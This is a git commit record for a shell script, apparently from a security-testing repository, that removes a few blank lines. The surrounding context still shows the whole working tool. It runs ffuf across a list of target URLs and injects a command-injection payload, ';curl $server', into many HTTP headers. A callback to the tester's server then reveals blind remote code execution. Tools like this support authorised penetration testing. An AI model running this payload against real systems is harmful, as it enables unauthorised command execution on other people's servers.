fbe95dda53b16bb0b56ec098e38269cd2ad73889
lemosnlmb <80685782+lemosnlmb@users.noreply.github.com>
2022-07-11 21:00:47 +0100

    Update blind-rce-headers.sh

--- rce/blind-rce-headers/blind-rce-headers.sh
+++ rce/blind-rce-headers/blind-rce-headers.sh
@@ -5,12 +5,9 @@
 RED='\033[1;31m'
 NC='\033[0m'
 
-
 list=$1
 server=$2
 
-
 echo -e "${RED}CHECK YOUR SERVER FOR POTENTIALS CALLBACKS!${NC}"
-
 ffuf -r -w $list:W1,headers.txt:W2 -H "W2: ;curl $server" -u W1 2 > /dev/null
 
